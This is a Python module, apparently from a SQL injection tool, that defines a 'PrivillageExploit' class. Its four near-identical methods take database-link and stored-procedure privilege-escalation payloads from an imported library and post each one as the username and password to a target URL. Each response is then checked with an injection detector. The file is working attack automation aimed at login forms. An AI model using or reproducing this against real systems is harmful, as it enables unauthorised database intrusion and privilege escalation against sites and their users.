import os
import sys
current_directory = os.getcwd()

sys.path.append(current_directory)

from lib.privillageessscalation.privillagepayload import PrivillagePayloads
from logger.sqljlog import logger as sqljlog
from logger.logs import logger
from lib.regelexpression.searchforvuln import detect_sql_injection as detector
import requests
from lib.regelexpression.extractparameter import extract_parameter_name
from random import choice
from INFO.common import tables


class PrivillageExploit:
    @staticmethod
    async def DBA_Exploit(urls):
        parameter,_ = await extract_parameter_name(urls)
        payload = PrivillagePayloads.Database_link_info_payloads(table=(choice(tables)))
        rows = payload.split("\n")
        sorted_rows = sorted(rows)
        sorted_payload = "\n".join(sorted_rows)

        for Payloads in sorted_payload.split("\n"):
            if Payloads == "":
                continue
            check = requests.get(urls)
            if check.status_code == 200:
                logger.info(f"Host:{urls}")
                params = {
                    "username":Payloads,
                    "password":Payloads
                }
                attack = requests.post(url=urls,data=params)
                sqljlog.info(f"Testing:{Payloads}")
                detector(attack.text)

            
            else:
                logger.critical("Host is down.")

    @staticmethod
    async def DB_link_info_payloads_default_exploit(urls):
        parameter,_ = await extract_parameter_name(urls)
        payload = PrivillagePayloads.Database_link_info_payloads_default()
        rows = payload.split("\n")
        sorted_rows = sorted(rows)
        sorted_payload = "\n".join(sorted_rows)

        for Payloads in sorted_payload.split("\n"):
            if Payloads == "":
                continue
            check = requests.get(urls)
            if check.status_code == 200:
                logger.info(f"Host:{urls}")
                params = {
                    "username":Payloads,
                    "password":Payloads
                }
                attack = requests.post(url=urls,data=params)
                sqljlog.info(f"Testing:{Payloads}")
                detector(attack.text)

            
            else:
                logger.critical("Host is down.")

    @staticmethod
    async def DB_link_info_payloads_auto_exploit(urls):
        parameter,_ = await extract_parameter_name(urls)
        payload = PrivillagePayloads.Database_link_info_payloads_default(table=(choice(tables)))
        rows = payload.split("\n")
        sorted_rows = sorted(rows)
        sorted_payload = "\n".join(sorted_rows)

        for Payloads in sorted_payload.split("\n"):
            if Payloads == "":
                continue
            check = requests.get(urls)
            if check.status_code == 200:
                logger.info(f"Host:{urls}")
                params = {
                    "username":Payloads,
                    "password":Payloads
                }
                attack = requests.post(url=urls,data=params)
                sqljlog.info(f"Testing:{Payloads}")
                detector(attack.text)

            
            else:
                logger.critical("Host is down.")

    @staticmethod
    async def Procedure_attack_exploit(urls):
        parameter,_ = await extract_parameter_name(urls)
        payload = PrivillagePayloads.Procedure_payload()
        rows = payload.split("\n")
        sorted_rows = sorted(rows)
        sorted_payload = "\n".join(sorted_rows)

        for Payloads in sorted_payload.split("\n"):
            if Payloads == "":
                continue
            check = requests.get(urls)
            if check.status_code == 200:
                logger.info(f"Host:{urls}")
                params = {
                    "username":Payloads,
                    "password":Payloads
                }
                attack = requests.post(url=urls,data=params)
                sqljlog.info(f"Testing:{Payloads}")
                detector(attack.text)

            
            else:
                logger.critical("Host is down.")

